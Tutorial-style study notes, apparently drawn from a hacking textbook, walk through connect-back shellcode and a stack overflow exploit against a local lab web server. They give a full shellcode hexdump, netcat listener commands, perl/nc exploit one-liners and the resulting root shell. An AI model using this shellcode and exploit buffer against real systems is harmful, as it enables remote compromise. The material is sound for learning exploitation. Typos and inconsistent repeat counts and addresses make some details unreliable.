+Port binding shellcode is easily foiled by firewalls.
+
+Most firewalls will block incoming connetions except for certain ports with known services. 
+
+This limit's the user's exposure and will prevent port-binding shellcode from receiving a connection. Software firewalls are so common that port-bind shellcode has little chance of actually working in the wild.
+
+However, firewalls do not typically filter outbound connections, since that would hinder usability. From inside the firewall, a user should be able to access any web page or make any other outbound connections. Means that if shellcode initiates the outbound connection, most firewalls will allow it. 
+
+Instead o waiting for a connection from an attacker, connect-back shellcode initates a TCP connection back from an attacker's IP address. 
+
+Opening a TCP connection only requires a call to socket() and a call to connect(). Very simliar to bind-ort shelcode since socket call is exactly the same and the connect() call takes the same type of arguments as bind(). 
+
+Following connect-back shellcode was made from the bind-port shellcode with a few modification
+
+connectback_shell.s
+
+In shellcode above, the connection IP address is set to 192.168.42.72 which should be IP address of attacking machine. This address is stored in the in_addr structures as 0x482aa8c0, which is hex representation of 72, 42, 168, and 192. 
+
+Since these values are stored in network byte order but x86 is in little-endian order, the stored DWORD seems to be reversed. Means the DWORD is 0x482aa8c0. 
+
+This also applies to two byte WORD used for the destination port. 
+
+Port number 31337 is 0x7a69 in hex in little endian. Means the displayed bytes must be reversed so WORD for 31337 is 0x697a.
+
+netcat can be used to listen for incoming connections iwth the -l option. This is used in the output below to listen on port 31337 for the connect-back shellcode
+
+ifconfig command ensures the IP address of eth0 is 192.168.42.72
+
+reader@hacking:~/booksrc $ sudo ifconfig eth0 192.168.42.72 up
+reader@hacking:~/booksrc $ ifconfig eth0
+eth0
+Link encap:Ethernet HWaddr 00:01:6C:EB:1D:50
+inet addr:192.168.42.72 Bcast:192.168.42.255 Mask:255.255.255.0
+UP BROADCAST MULTICAST MTU:1500 Metric:1
+RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+collisions:0 txqueuelen:1000
+RX bytes:0 (0.0 b) TX bytes:0 (0.0 b)
+Interrupt:16
+reader@hacking:~/booksrc $ nc -v -l -p 31337
+listening on [any] 31337 ...
+
+Now try to exploit tinyweb server program using connectback shellcode
+
+From before, we know tha trequest buffer is 500 bytes lon gand is located at 0xbffff5c0 in stack memory. Also know return address is found within 40 bytes of end of buffer
+
+nasm connectback_shell.s
+hexdump -C connectback_shell
+wc -c connectback_shell
+echo $(( 544 - (4 * 16) - 78))
+gdb -q --batch -ex "p /x 0xbffff5c0 + 200"
+
+Since offset from beginning of buffer to return address is 540 bytes, a total of 544 bytes must be written to overwrite the four-byte return address. 
+
+Return address overwrite also needs to be properly algiend, since the return address uses multiple bytes.
+
+To ensure proper alignment, the sum o fthe NOP sled and shellcode bytes must be divisible by four. In addition, the shellcode itself must stay within the first 500 bytes of the overwrite. These are the bounds of the response buffer, and the memory afterward corresponds to other values on the stack that might be written to before we change the program's control flow. 
+
+Staying within these bounds avoids the risk of random overwrites to the shellcode, which inevitably leads to crashes. Repeating the return address 16 times wil generate 64 bytes, which can be put at the end of the 544 byte exploit buffer and keeps the shellcode safely within the bounds of the buffer. 
+
+Remaining bytes at beginning of exploit buffer will be the NOP sled. Calculations above show that a 402 byte NOP sled will properly align the 78byte shellcode and place it safely within the bounds of the buffer. Repeating the designed return address 12 times spaces the final 4 bytes of the exploit buffer perfectly to overwrite the saved return address on the stack. 
+
+OVerwriting the return address with 0xbffff688 should return execution right to the middle of the NOP sled, while avoiding bytes near the beginning of the buffer, which might get mangled. 
+
+These calculated values will be used in the following exploit but first the connect back shell needs some place to connect back to.
+
+In output below, netcat is used to listen for incoming connections on port 31337
+
+reader@hacking:~/booksrc $ nc -v -l -p 31337
+listening on [any] 31337 ...
+
+Now, in another terminal, the calculated exploit values can be used to exploit the tinyweb program remotely
+
+From Another Terminal Window
+
+reader@hacking:~/booksrc $ (perl -e 'print "\x90"x402';
+> cat connectback_shell;
+> perl -e 'print "\x88\xf6\xff\xbf"x20 . "\r\n"') | nc -v 127.0.0.1 80
+localhost [127.0.0.1] 80 (www) open
+
+Back in original terminal, the shellcode has connected back to the netcat process listening on port 31337. Tihs provides root access remotely.
+
+reader@hacking:~/booksrc $ nc -v -l -p 31337
+listening on [any] 31337 ...
+connect to [192.168.42.72] from hacking.local [192.168.42.72] 34391
+whoami
+root
+
+The network configuration for this example is slightly confusing because the attack is directed at 127.0.0.1 and the shellcode connects back to 192.168.42.72. Both these IP addresses route to same place, but 192.168.42.62 is easier to use in shellcode than 127.0.0.1
+
+Since loopback addres contains two null bytes, the address must be built on the stack with multiple instructions. 
+
+One way to do this is to write the two null bytes to the stack using a zeroed register.
+
+The file loopback_shell.s is a modified version of connectback_shell that uses the loopbackaddress of 127.0.0.1
+
+Differences are shown in following output:
+
+reader@hacking:~/booksrc $ diff connectback_shell.s loopback_shell.s
+21c21,22
+<
+push DWORD 0x482aa8c0 ; Build sockaddr struct: IP Address = 192.168.42.72
+---
+>
+push DWORD 0x01BBBB7f ; Build sockaddr struct: IP Address = 127.0.0.1
+>
+mov WORD [esp+1], dx ; overwrite the BBBB with 0000 in the previous push
+reader@hacking:~/booksrc $
+
+After pushing value 0x01BBBB7f to stack, the ESP register will point to beginning o fthis DWORD. By writing a two byte WORD of null bytes at ESP+1, the middle two bytes will be overwritten to form the correct return address.
+
+This additional instruction increases the size of the shellcode by a few bytes, which means the NOP sled also needs to be adjusted for the exploit buffer. These calculations are shown in output below and result in a 397 byte NOP sled. 
+
+This exploit using the loopback shellcode assumes the tinyweb program is running and that a netcat process is listening for incoming connections on port 31337
+
+reader@hacking:~/booksrc $ nasm loopback_shell.s
+reader@hacking:~/booksrc $ hexdump -C loopback_shell | grep --color=auto 00
+00000000 6a 66 58 99 31 db 43 52 6a 01 6a 02 89 e1 cd 80 |jfX.1.CRj.j.....|
+00000010 96 6a 66 58 43 68 7f bb bb 01 66 89 54 24 01 66 |.jfXCh....f.T$.f|
+00000020 68 7a 69 66 53 89 e1 6a 10 51 56 89 e1 43 cd 80 |hzifS..j.QV..C..|
+00000030 87 f3 87 ce 49 b0 3f cd 80 49 79 f9 b0 0b 52 68 |....I.?..Iy...Rh|
+00000040 2f 2f 73 68 68 2f 62 69 6e 89 e3 52 89 e2 53 89 |//shh/bin..R..S.|
+00000050 e1 cd 80
+|...|
+00000053
+reader@hacking:~/booksrc $ wc -c loopback_shell
+83 loopback_shell
+reader@hacking:~/booksrc $ echo $(( 544 - (4*16) - 83 ))
+397
+reader@hacking:~/booksrc $ (perl -e 'print "\x90"x397';cat loopback_shell;perl -e 'print "\x88\
+xf6\xff\xbf"x16 . "\r\n"') | nc -v 127.0.0.1 80
+localhost [127.0.0.1] 80 (www) open
+
+As with previous exploit, terminal with netcat listening on port 31337 will receive the rootshell
+
+reader@hacking:~ $ nc -vlp 31337
+listening on [any] 31337 ...
+connect to [127.0.0.1] from localhost [127.0.0.1] 42406
+whoami
+root
+
+
+
+
+
